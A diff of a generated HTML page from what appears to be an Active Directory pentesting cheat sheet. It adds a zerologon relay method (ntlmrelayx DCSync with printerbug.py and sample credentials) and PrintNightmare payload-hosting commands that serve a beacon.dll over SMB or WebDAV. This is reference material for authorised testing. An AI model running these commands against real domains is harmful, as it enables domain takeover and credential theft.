@@ -16,7 +16,7 @@
 <link rel="icon" href="/favicon.png" type="image/x-icon">
 <link rel="stylesheet" href="/book.min.4b35fed0bea034bbc19c89c71e14b73fb9c68cfcc586b9382adfb9b7b103ba06.css" integrity="sha256-SzX&#43;0L6gNLvBnInHHhS3P7nGjPzFhrk4Kt&#43;5t7EDugY=" crossorigin="anonymous">
   <script defer src="/flexsearch.min.js"></script>
-  <script defer src="/en.search.min.785c947877d58948262724960b7f142778965360cffc327852311c6a1bf73916.js" integrity="sha256-eFyUeHfViUgmJySWC38UJ3iWU2DP/DJ4UjEcahv3ORY=" crossorigin="anonymous"></script>
+  <script defer src="/en.search.min.64f1c39066325b2efbc25f5206c32a51ec90ced09ef5d3e8ac8521319cae18bf.js" integrity="sha256-ZPHDkGYyWy77wl9SBsMqUeyQztCe9dPorIUhMZyuGL8=" crossorigin="anonymous"></script>
 
   <script defer src="/sw.min.6f6f90fcb8eb1c49ec389838e6b801d0de19430b8e516902f8d75c3c8bd98739.js" integrity="sha256-b2&#43;Q/LjrHEnsOJg45rgB0N4ZQwuOUWkC&#43;NdcPIvZhzk=" crossorigin="anonymous"></script>
 
@@ -91,6 +91,19 @@ https://github.com/alex-shpak/hugo-book
 
   
   <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/cobalt_strike_all_you_need/" class="">Cobalt Strike</a>
+  
+
+        </li>
+      
     
       
         <li>
@@ -308,19 +321,6 @@ https://github.com/alex-shpak/hugo-book
 
   
     <a href="/docs/methodology_and_enumeration/" class="">Bug Hunting Methodology and Enumeration</a>
-  
-
-        </li>
-      
-    
-      
-        <li>
-          
-  
-  
-
-  
-    <a href="/docs/cobalt_strike_all_you_need/" class="">Cobalt Strike</a>
   
 
         </li>
@@ -1171,6 +1171,7 @@ https://github.com/alex-shpak/hugo-book
             <li><a href="#shadow-credentials">Shadow Credentials</a></li>
             <li><a href="#dangerous-built-in-groups-usage">Dangerous Built-in Groups Usage</a></li>
             <li><a href="#abusing-dns-admins-group">Abusing DNS Admins Group</a></li>
+            <li><a href="#active-directory-groupsactive-directory-groups"><a href="#active-directory-groups">Active Directory Groups</a></a></li>
             <li><a href="#abusing-active-directory-aclsaces">Abusing Active Directory ACLs/ACEs</a></li>
             <li><a href="#dcom-exploitation">DCOM Exploitation</a></li>
             <li><a href="#trust-relationship-between-domains">Trust relationship between domains</a></li>
@@ -1744,7 +1745,24 @@ Profit!</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>crackmapexec smb <span style="color:#ae81ff">10.10</span>.10.10 -u username -p password -d domain -M zerologon
 </span></span></code></pre></div></li>
 </ul>
-<h4 id="printnightmare">
+<p>A 2nd approach to exploit zerologon is done by relaying authentication.</p>
+<p>This technique, <a href="https://dirkjanm.io/a-different-way-of-abusing-zerologon">found by dirkjanm</a>, requires more prerequisites but has the advantage of having no impact on service continuity.
+The following prerequisites are needed:</p>
+<ul>
+<li>A domain account</li>
+<li>One DC running the <code>PrintSpooler</code> service</li>
+<li>Another DC vulnerable to zerologon</li>
+</ul>
+<p><code>ntlmrelayx</code> - from Impacket and any tool such as <a href="https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py"><code>printerbug.py</code></a></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span><span style="color:#75715e"># Check if one DC is running the PrintSpooler service</span>
+</span></span><span style="display:flex;"><span>rpcdump.py <span style="color:#ae81ff">10.10</span>.10.10 | grep -A <span style="color:#ae81ff">6</span> <span style="color:#e6db74">&#34;spoolsv&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Setup ntlmrelay in one shell</span>
+</span></span><span style="display:flex;"><span>ntlmrelayx.py -t dcsync<span style="color:#960050;background-color:#1e0010">:</span>//DC01.LAB.LOCAL -smb2support
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#Trigger printerbug in 2nd shell</span>
+</span></span><span style="display:flex;"><span>python3 printerbug.py <span style="color:#e6db74">&#39;LAB.LOCAL&#39;</span>/joe<span style="color:#960050;background-color:#1e0010">:</span>Password123@10.10.10.10 <span style="color:#ae81ff">10.10</span>.10.12
+</span></span></code></pre></div><h4 id="printnightmare">
   PrintNightmare
   <a class="anchor" href="#printnightmare">#</a>
 </h4>
@@ -1774,8 +1792,24 @@ The exploit will execute the DLL either from the local filesystem or a remote sh
 </span></span><span style="display:flex;"><span>docker run -it itwasalladream -u username -p Password123 -d domain <span style="color:#ae81ff">10.10</span>.10.10
 </span></span></code></pre></div></li>
 </ul>
-<p><strong>Trigger the exploit</strong>:</p>
-<p><strong>NOTE</strong>: The payload can be hosted on Impacket SMB server since <a href="https://github.com/SecureAuthCorp/impacket/pull/1109">PR #1109</a>: <code>python3 ./smbserver.py share /tmp/smb/</code> or using <a href="https://github.com/3gstudent/Invoke-BuildAnonymousSMBServer/blob/main/Invoke-BuildAnonymousSMBServer.ps1">Invoke-BuildAnonymousSMBServer</a> : <code>Import-Module .\Invoke-BuildAnonymousSMBServer.ps1; Invoke-BuildAnonymousSMBServer -Path C:\Share -Mode Enable</code></p>
+<p><strong>Trigger the exploit</strong>:
+<strong>Payload Hosting</strong>:</p>
+<ul>
+<li>The payload can be hosted on Impacket SMB server since <a href="https://github.com/SecureAuthCorp/impacket/pull/1109">PR #1109</a>:</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ps1" data-lang="ps1"><span style="display:flex;"><span>python3 ./smbserver.py share /tmp/smb/
+</span></span></code></pre></div><ul>
+<li>Using <a href="https://github.com/3gstudent/Invoke-BuildAnonymousSMBServer/blob/main/Invoke-BuildAnonymousSMBServer.ps1">Invoke-BuildAnonymousSMBServer</a> (Admin rights required on host):</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ps1" data-lang="ps1"><span style="display:flex;"><span>Import-Module .\Invoke-BuildAnonymousSMBServer.ps1; Invoke-BuildAnonymousSMBServer -Path C:\Share -Mode Enable
+</span></span></code></pre></div><ul>
+<li>Using WebDav with <a href="https://github.com/mgeeky/SharpWebServer">SharpWebServer</a> (Doesn&rsquo;t require admin rights):</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ps1" data-lang="ps1"><span style="display:flex;"><span>SharpWebServer.exe port=<span style="color:#ae81ff">8888</span> dir=c:\users\public verbose=true
+</span></span></code></pre></div><p>When using WebDav instead of SMB, you must add <code>@[PORT]</code> to the hostname in the URI, e.g.: <code>\\172.16.1.5@8888\Downloads\beacon.dll</code>
+WebDav client <strong>must</strong> be activated on exploited target. By default it is not activated on Windows workstations (you have to <code>net start webclient</code>) and it&rsquo;s not installed on servers. Here is how to detect activated webdav:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ps1" data-lang="ps1"><span style="display:flex;"><span>cme smb -u user -p password -d domain.local -M webdav [<span style="color:#66d9ef">TARGET</span>]
+</span></span></code></pre></div><p><strong>NOTE</strong>: The payload can be hosted on Impacket SMB server since <a href="https://github.com/SecureAuthCorp/impacket/pull/1109">PR #1109</a>: <code>python3 ./smbserver.py share /tmp/smb/</code> or using <a href="https://github.com/3gstudent/Invoke-BuildAnonymousSMBServer/blob/main/Invoke-BuildAnonymousSMBServer.ps1">Invoke-BuildAnonymousSMBServer</a> : <code>Import-Module .\Invoke-BuildAnonymousSMBServer.ps1; Invoke-BuildAnonymousSMBServer -Path C:\Share -Mode Enable</code></p>
 <ul>
 <li><a href="https://github.com/cube0x0/CVE-2021-1675">SharpNightmare</a>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span><span style="color:#75715e"># require a modified Impacket: https://github.com/cube0x0/impacket</span>
@@ -3811,6 +3845,16 @@ E.g: if someone tries to delete this user from the Domain Admins in an hour or l
 </span></span><span style="display:flex;"><span>sc \\dc01 start dns
 </span></span></code></pre></div></li>
 </ul>
+<h3 id="active-directory-groupsactive-directory-groups">
+  <a href="#active-directory-groups">Active Directory Groups</a>
+  <a class="anchor" href="#active-directory-groupsactive-directory-groups">#</a>
+</h3>
+<ul>
+<li><a href="#dangerous-built-in-groups-usage">Dangerous Built-in Groups Usage</a></li>
+<li><a href="#abusing-dns-admins-group">Abusing DNS Admins Group</a></li>
+<li><a href="#abusing-schema-admins-group">Abusing Schema Admins Group</a></li>
+<li><a href="#abusing-backup-operators-group">Abusing Backup Operators Group</a></li>
+</ul>
 <h3 id="abusing-active-directory-aclsaces">
   Abusing Active Directory ACLs/ACEs
   <a class="anchor" href="#abusing-active-directory-aclsaces">#</a>
@@ -5107,6 +5151,7 @@ By default, the key is only readable if you have <strong>root</strong> permissio
             <li><a href="#shadow-credentials">Shadow Credentials</a></li>
             <li><a href="#dangerous-built-in-groups-usage">Dangerous Built-in Groups Usage</a></li>
             <li><a href="#abusing-dns-admins-group">Abusing DNS Admins Group</a></li>
+            <li><a href="#active-directory-groupsactive-directory-groups"><a href="#active-directory-groups">Active Directory Groups</a></a></li>
             <li><a href="#abusing-active-directory-aclsaces">Abusing Active Directory ACLs/ACEs</a></li>
             <li><a href="#dcom-exploitation">DCOM Exploitation</a></li>
             <li><a href="#trust-relationship-between-domains">Trust relationship between domains</a></li>
